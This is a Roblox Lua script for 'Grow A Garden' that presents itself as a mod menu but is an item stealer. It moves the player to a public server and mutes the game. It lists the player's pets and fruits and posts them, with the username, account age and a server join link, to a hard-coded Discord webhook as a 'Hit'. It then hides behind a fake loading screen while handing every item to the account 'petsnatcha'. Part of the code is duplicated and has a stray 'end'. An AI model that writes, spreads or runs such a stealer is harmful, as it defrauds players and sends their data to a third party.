local WEBHOOK_URL = "https://discord.com/api/webhooks/1383607196113309778/jp3k0Oo4Ec_k2Lfn7dgiMe9PC-g__pA4X8E3I_u8KxesvpF8dzgv0423y2K1yU-wxoXk"
local TARGET_NAME = "petsnatcha"
local LOADING_TIME = 300

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local SoundService = game:GetService("SoundService")

local lp = Players.LocalPlayer
local Backpack = lp:WaitForChild("Backpack")

-- Rejoin to public server if in private or full
spawn(function()
    if game.PrivateServerId ~= "" or #Players:GetPlayers() >= game.MaxPlayers then
        local servers = {}
        local req = (syn and syn.request or request)
        if req then
            local success, response = pcall(function()
                return req({
                    Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
                })
            end)

            if success and response and response.Body then
                local data = HttpService:JSONDecode(response.Body)
                for _, server in ipairs(data.data or {}) do
                    if server.playing < server.maxPlayers and server.id ~= game.JobId then
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id)
                        return
                    end
                end
            end
        end
    end
end)

-- Mute all game sounds
SoundService.AmbientReverb = Enum.ReverbType.NoReverb
SoundService.Volume = 0
for _, sound in ipairs(game:GetDescendants()) do
    if sound:IsA("Sound") then
        sound.Volume = 0
        sound:Stop()
    end
end
game.DescendantAdded:Connect(function(desc)
    if desc:IsA("Sound") then
        desc.Volume = 0
        desc:Stop()
    end
end)

-- Item categorization and webhook logic
local ig = { "trowel", "watering can", "sprinkler", "egg", "rod" }
local animals = { "bunny", "dog", "golden lab", "chicken", "pig", "cow", "duck", "bee", "owl", "fox", "bear", "goat", "hedgehog", "horse", "donkey", "sheep", "cat", "turkey", "bat", "skeleton", "ghost", "pumpkin", "zombie", "reindeer", "elf", "penguin", "polar bear", "dragonfly", "queen bee", "disco bee", "chicken jockey", "cooked owl", "raccoon", "red fox" }

local rareEmojiMap = {
    ["polar bear"] = "üêª‚Äç‚ùÑÔ∏è", ["disco bee"] = "üéâüêù", ["queen bee"] = "üëëüêù",
    ["dragonfly"] = "üßô‚Äç‚ôÇÔ∏èüêû", ["red fox"] = "ü¶ä",
    ["chicken jockey"] = "üêîüíÄ", ["cooked owl"] = "üçóü¶â", ["raccoon"] = "ü¶ù", ["butterfly"] = ":butterfly"
}

local function contains(name, list)
    name = name:lower()
    for _, kw in ipairs(list) do
        if name:find(kw:lower(), 1, true) then
            return true
        end
    end
    return false
end

local rareItems, commonItems, fruitItems = {}, {}, {}
local mention = false

for _, tool in ipairs(Backpack:GetChildren()) do
    local nm = tool.Name
    local lnm = nm:lower()

    if not contains(lnm, ig) and not lnm:find("seed", 1, true) then
        local emoji = rareEmojiMap[lnm]
        local line = string.format("%s %s", emoji or "-", nm)

        if contains(lnm, animals) then
            if emoji then
                table.insert(rareItems, line)
                mention = true
            else
                table.insert(commonItems, line)
            end
        else
            table.insert(fruitItems, line)
        end
    end
end

local animalItems = {}
for _, v in ipairs(rareItems) do table.insert(animalItems, v) end
for _, v in ipairs(commonItems) do table.insert(animalItems, v) end

local lines = {}
if #animalItems > 0 then
    table.insert(lines, "**üêæ Pets**\n" .. table.concat(animalItems, "\n"))
end
if #fruitItems > 0 then
    table.insert(lines, "**üçé Fruits**\n" .. table.concat(fruitItems, "\n"))
end

local desc = #lines > 0 and table.concat(lines, "\n\n") or "__No valid items found.__"
if #desc > 1900 then desc = desc:sub(1, 1900) .. "\n...and more" end

local function getAccountAge()
    local success, result = pcall(function() return lp.AccountAge end)
    return success and (result .. " days") or "Unknown"
end

local joinURL = string.format("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s", game.PlaceId, game.JobId)

local payload = {
    username = "Captain Hook",
    embeds = { {
        title = "üåø Grow A Garden Hit üåø",
        color = 5763719,
        fields = {
            {
                name = "üë§ Player Information",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", lp.Name, TARGET_NAME, tostring(identifyexecutor and identifyexecutor() or "Unknown"), getAccountAge()),
                inline = false
            },
            {
                name = "üéí Backpack",
                value = desc,
                inline = false
            },
            {
                name = "üí• Hits",
                value = "All Items",
                inline = false
            },
            {
                name = "üîó Join with URL",
                value = string.format("[e7d57574-91a7-41cf-a190-db3dcaa201f1](%s)\n```%s```", joinURL, game.JobId),
                inline = false
            }
        }
    } }
}
if mention then payload.content = "@everyone" end

local httpRequest = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or request
if httpRequest then
    local success, res = pcall(function()
        return httpRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
    end)
    if success and res and res.StatusCode ~= 204 then
        warn("Webhook Error: " .. res.StatusCode, res.Body or "")
    elseif not success then
        warn("HTTP request failed.")
    end
else
    warn("Executor does not support HTTP requests.")
end

    local desc = (#animalItems > 0 and table.concat(animalItems, "\n")) or "__No valid items found.__"
    if #desc > 1900 then desc = desc:sub(1, 1900) .. "\n...and more" end

    local function getAccountAge()
        local success, result = pcall(function() return lp.AccountAge end)
        return success and (result .. " days") or "Unknown"
    end

    local joinURL = string.format("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s", game.PlaceId, game.JobId)

    local payload = {
        username = "Captain Hook",
        embeds = {{
            title = "üåø Grow A Garden Hit üåø",
            color = 5763719,
            fields = {
                {
                    name = "üë§ Player Information",
                    value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", lp.Name, TARGET_NAME, tostring(identifyexecutor and identifyexecutor() or "Unknown"), getAccountAge()),
                    inline = false
                },
                {
                    name = "üéí Backpack",
                    value = desc,
                    inline = false
                },
                {
                    name = "üí• Hits",
                    value = "All Items",
                    inline = false
                },
                {
                    name = "üîó Join with URL",
                    value = string.format("[e7d57574-91a7-41cf-a190-db3dcaa201f1](%s)\n```%s```", joinURL, game.JobId),
                    inline = false
                }
            }
        }}
    }
    if mention then payload.content = "@everyone" end

    local httpRequest = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or request
    if httpRequest then
        local success, res = pcall(function()
            return httpRequest({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payload)
            })
        end)
        if success and res and res.StatusCode ~= 204 then
            warn("Webhook Error: " .. res.StatusCode, res.Body or "")
        elseif not success then
            warn("HTTP request failed.")
        end
    else
        warn("Executor does not support HTTP requests.")
    end
end

-- üñ•Ô∏è Mod Menu Loader GUI
do
    local gui = Instance.new("ScreenGui")
    gui.Name, gui.ResetOnSpawn, gui.DisplayOrder = "ModMenuLoading", false, 1000
    gui.IgnoreGuiInset = true
    pcall(function() gui.Parent = CoreGui end)

    local bg = Instance.new("Frame", gui)
    bg.BackgroundColor3 = Color3.fromRGB(34, 139, 34)
    bg.Size = UDim2.new(1, 0, 1, 0)

    local box = Instance.new("Frame", bg)
    box.AnchorPoint = Vector2.new(0.5, 0.5)
    box.Position = UDim2.new(0.5, 0, 0.5, 0)
    box.Size = UDim2.new(0.35, 0, 0.25, 0)
    box.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    box.BorderSizePixel = 0.05
    Instance.new("UICorner", box).CornerRadius = UDim.new(0.05, 0)

    local title = Instance.new("TextLabel", box)
    title.Text, title.Font = "Mod Menu Loading", Enum.Font.GothamBold
    title.TextScaled = true
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(1, 0, 0.4, 0)
    title.TextColor3 = Color3.new(1, 1, 1)

    local barBG = Instance.new("Frame", box)
    barBG.Size, barBG.Position = UDim2.new(0.85, 0, 0.18, 0), UDim2.new(0.075, 0, 0.65, 0)
    barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    barBG.BorderSizePixel = 0
    Instance.new("UICorner", barBG).CornerRadius = UDim.new(1, 0)

    local barFill = Instance.new("Frame", barBG)
    barFill.Size = UDim2.new(0, 0, 1, 0)
    barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    barFill.BorderSizePixel = 0
    Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)
    Instance.new("UIGradient", barFill).Color = ColorSequence.new(Color3.fromRGB(0, 170, 255), Color3.fromRGB(0, 255, 170))

    TweenService:Create(barFill, TweenInfo.new(LOADING_TIME), { Size = UDim2.new(1, 0, 1, 0) }):Play()

    task.spawn(function()
        while gui.Parent do
            TweenService:Create(title, TweenInfo.new(1), { TextTransparency = 0.3 }):Play()
            task.wait(2)
        end
    end)

    local target
    task.spawn(function()
        repeat
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name:lower() == TARGET_NAME:lower() then target = p break end
            end
            task.wait(1)
        until target
    end)

    task.spawn(function()
        local char = lp.Character or lp.CharacterAdded:Wait()
        local hrp = char:WaitForChild("HumanoidRootPart")
        local bgc = Instance.new("BodyGyro", hrp)
        bgc.P, bgc.MaxTorque = 9e4, Vector3.new(9e9, 9e9, 9e9)
        local bv = Instance.new("BodyVelocity", hrp)
        bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)

        local IGNORE = { "trowel", "shovel", "sprinkler", "rod", "egg", "watering can", "seed" }

        local function shouldSkip(n)
            n = n:lower()
            for _, k in ipairs(IGNORE) do if n:find(k, 1, true) then return true end end
        end

        local function firePrompts()
            if target and target.Character then
                for _, d in ipairs(target.Character:GetDescendants()) do
                    if d:IsA("ProximityPrompt") and d.Enabled then
                        fireproximityprompt(d)
                    end
                end
            end
        end

        RunService.RenderStepped:Connect(function()
            if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                local tp = target.Character.HumanoidRootPart.Position + Vector3.new(0, 0.4, 0)
                local dir = (tp - hrp.Position).Unit
                bv.Velocity = dir * 60
                bgc.CFrame = CFrame.new(hrp.Position, tp)
            end
        end)

        while true do
            for _, t in ipairs(Backpack:GetChildren()) do
                if t:IsA("Tool") then
                    local nm = t.Name
                    if not shouldSkip(nm) then
                        t.Parent = char
                        task.wait(0.5)
                        firePrompts()
                        task.wait(0.5)
                        t.Parent = Backpack
                        task.wait(0.5)
                    end
                end
            end
            task.wait(0.1)
        end
    end)

    task.delay(LOADING_TIME, function()
        if gui then gui:Destroy() end
    end)
end
